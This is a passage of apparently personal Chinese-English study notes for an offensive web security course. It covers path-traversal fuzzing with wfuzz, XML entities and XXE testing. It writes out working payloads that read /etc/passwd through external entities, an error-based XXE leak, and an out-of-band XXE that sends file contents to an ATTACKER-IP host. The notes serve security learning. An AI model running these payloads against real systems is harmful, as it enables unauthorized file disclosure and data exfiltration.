/download/someFileData 👉 檔案讀取 99%
```

## Relative vs. Absolute Pathing
絕對路徑 vs. 相對路徑  

>[!Note]
>root directory:
>- Unix-based: `/`
>- Windows: `C:\`

## Fuzzing the Path Parameter
可以透過 Wfuzz 自動化確認目標上存在哪些檔案\
搭配 wordlist: `/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt`
```
wfuzz -c -z file,/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt http://dirTravSandbox:80/relativePathing.php?path=../../../../../../../../../../FUZZ
```
> `-c`: 顯示顏色 
> `-z`: payload parameter
> `--hc 404` : 濾掉錯誤輸出 404 Response
> `--hh`: 濾掉錯誤輸出 Chars

```
wfuzz -c -z file,/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt --hc 404 --hh 81,125 http://dirTravSandbox/relativePathing.php?path=../../../../../../../../../../../../FUZZ
```

# XML External Entities
Extensible Markup Language (XML) 便於人類和機器讀取的方式對資料進行編碼，使用 XML 的應用程式通常會用 parser 來驗證資料並將其轉換為 internal object\
Ex. Application 可以將通訊錄中的聯絡人匯出為 XML 格式，或者應用程式可以接受庫存目錄作為輸入

## Introduction to XML
XML documents 包含 markup 和 content，且每個 XML 都要定義自己的一組 tags
```xml
<?xml version="1.0" encoding="UTF-8"?>
  <contacts>
    <contact id="41">
      <firstName>CHW</firstName>
      <lastName>Frank</lastName>
    </contact>
    <contact id="42">
      <firstName>Kali</firstName>
      <lastName>Chen</lastName>
    </contact>
  </contacts>
```
>  XML 必須包含一個 root element，所有元素都必須包含在該根元素中。除非是空元素，否則每個元素都必須有 beginning tag 和 end tag。所有標籤都區分大小寫，且元素必須正確嵌套。\
>  firstName 和 lastName elements 是 contact 的 sub-elements
> 1. Tag: XML 沒有內建 tag，後端自己定義 且 Parser 全部接收
> 2. Attribute: 跟 element 一樣重要，很多 XXE payload 會放在 attribute

若 XML document 需要將 `<` 和 `>` 當作文字，需要對字元進行編碼或將其包含在字元資料 CDATA section
```xml
<![CDATA[ content ]]>
```
> CDATA 內的東西會視為文字而非標記，有時可用來繞過過濾


[Document Type Definitions (DTD)](https://en.wikipedia.org/wiki/Document_type_definition): 用於定義 SGML 系列標記語言（ GML 、 SGML 、 XML 、 HTML ）的文檔類型，DTD 規範文件可用於驗證文件。\
DTD = 給 Parser 的規則說明書:
```xml
<!DOCTYPE root [
  <!ENTITY name "CHW">
]>
```
> 可以定義 Entity

正常 Entity: `<!ENTITY name "Tom">`\
在使用 XML `<firstName>&name;</firstName>` 後，會呈現 `<firstName>CHW</firstName>`

>[!Tip]
>External Entity:\
>`<!ENTITY xxe SYSTEM "file:///etc/passwd">`\
>使用 `<data>&xxe;</data>`
>> 讀取 /etc/passwd，將內容塞進 <data>


### XML Entitie
XML Entity: Parser 會在解析時自動替換內容的變數

DTD 可用於在 XML document 中宣告 XML Entitie。簡單來說，XML Entitie 是一種包含有效 XML code 的資料結構，該 code 會在文件中被多次引用，也可以被視為內容的 placeholder。

DTD 在 XML document 開頭使用特殊的 DOCTYPE tag:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE name [ 
     ...
]>
```

#### 1. Internal Entity
Internal entities 在 DTD 內部進行本地定義
```xml
<!ENTITY name "entity_value">
```
實際範例：
```xml
<!ENTITY test "<entity-value>test value</entity-value>">
```
使用 `<data>&test;</data>`，Parser 後: `<data><entity-value>test value</entity-value></data>`

>[!Important] Offensive site:
>❌ 不能讀檔
>❌ 不能 SSRF
>用來測試 Entity 有沒有開
>Blind XXE 或建構 payload 用

#### 2. External Entity
用於檢索外部資料的 URI ，External Entity 可以分為兩類：private external entity 和 public external entity

- private external entity: `SYSTEM`
```xml
<!ENTITY name SYSTEM "URI">
```
實際範例： (使用外部端點)
```xml
<!ENTITY offsecinfo SYSTEM "http://www.offsec.com/company.xml">
```
```xml
<!ENTITY xxe SYSTEM "file:///etc/passwd">
```

`SYSTEM` keyword 表示是 private external entity，設計用於公司內部的開發人員或團隊使用，不適用於公共用途。

- public external entity: `PUBLIC`
    
public external entity 的面向更廣泛。例如，在設計使用 XML 的標準（如 HTML 或 SVG）時，可能會使用到公共外部實體
```xml
<!ENTITY % name SYSTEM "URI">
```
實際範例： (使用外部端點)
```xml
<!ENTITY offsecinfo PUBLIC "-//W3C//TEXT companyinfo//EN" "http://www.offsec.com/companyinfo.xml">
```
public external entity 可以指定 public_id，XML pre-processors 會使用 public_id 作為外部解析備用 URI。雖然開發人員使用正確的聲明很重要，但就 Offensive 的目的而言視為同義詞
    
#### 3. Parameter Entity
Parameter Entity 只存在 DTD 中，與其他 entity 非常相似\
定義語法只在於是否包含 `%` prefix 有所不同
```xml
<!ENTITY % name SYSTEM "URI">
```
實際範例： 
```xml
<!ENTITY % course 'WEB 200'>
<!ENTITY Title 'Offensive Security presents %course;'>
```
> Parser 過後顯示: `Offensive Security presents WEB 200`

## Understanding XML External Entity Processing Vulnerabilities
XXE = 控制 XML Parser 強迫去讀不該讀的東西
    
>[!Important]
> XXE 必要條件:
> 1. 應用程式會解析 XML
> - SOAP
> - REST API（Content-Type: application/xml）
> - 上傳 XML
> - Java / .NET / PHP XML parser
> 2. XML Parser 允許 DTD
> - <!DOCTYPE …> 沒被擋
> - SYSTEM / PUBLIC 可用
> - External Entity 沒被 disable
> 3. 能夠控制 XML 內容
> - Request body
> - File upload
> - API input
> - SOAP envelope


## Testing for XXE
如何測試該應用程式有 XXE 漏洞:
看到至少一個：
- Content-Type: application/xml
- SOAP XML
- 上傳 .xml
- API body 明顯是 XML


```xml
<?xml version="1.0" ?>
<!DOCTYPE data [
<!ELEMENT data ANY >
<!ENTITY lastname "Replaced">
]>
<Contact>
  <lastName>&lastname;</lastName>
  <firstName>Tom</firstName>
</Contact>
```
如果解析器將 entity reference  `&lastname;` 替換為 `Replaced`（entity's value），則 parser 容易受到 XXE 漏洞攻擊\
為了存取 entity，應用程式必須解析 XML: 意味著 XML 必須格式良好，並且符合應用程式的預期格式。如果發現某個應用程式會處理 XML，應該嘗試取得該應用程式使用的範例 XML 文檔，並將其作為攻擊負載的基礎\
👉 確認 DTD + Entity 有沒有被處理

###  Retrieving Files
若確認存在 XXE 漏洞，可以嘗試從伺服器檢索檔案，升級成 External Entity（讀檔）
```xml
<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data ANY >
<!ENTITY lastname SYSTEM "file:///etc/passwd">
]>
<Contact>
  <lastName>&lastname;</lastName>
  <firstName>Tom</firstName>
</Contact>
```

## Error-based Testing
當 XML 有被 parse、External Entity 有效，但 response 沒有直接顯示結果且系統會回 verbose error
```xml
<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % error "<!ENTITY leak SYSTEM 'file:///nonexistent/%file;'>">
  %error;
]>
<Contact>
  <lastName>&leak;</lastName>
</Contact>
```
> 宣告一個不存在的檔案路徑，並定義錯誤訊息裡包含整個檔名
>> `FileNotFoundException: /nonexistent/root:x:0:0:root:/root:/bin/bash`

    
若遇到沒有 verbose error、Parser 吃錯誤但 app 不回傳等，就要用 OOB
## Out-of-Band Testing
當 XML parse OK、Entity OK，但 Response 完全沒資料、沒錯誤
👉  讓 target server 主動對控制的 server 發 request

```xml
<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://ATTACKER-IP/xxe.dtd">
  %dtd;
]>
<Contact>
  <lastName>&send;</lastName>
</Contact>
```
在 ATTACKER-IP Server 上:
```
<!ENTITY send SYSTEM "http://ATTACKER-IP/leak?data=%file;">
```

# Server-side Template Injection - Discovery and Exploitation

>[!Caution]
> HackMD 筆記長度限制，接續 [OSWA: Self Note - Part 2](https://hackmd.io/@CHW/rk6oG1K8bx)
    
# [Link to: "[OSWA, WEB-200] Instructional notes - Part 2"](https://hackmd.io/@CHW/rk6oG1K8bx)



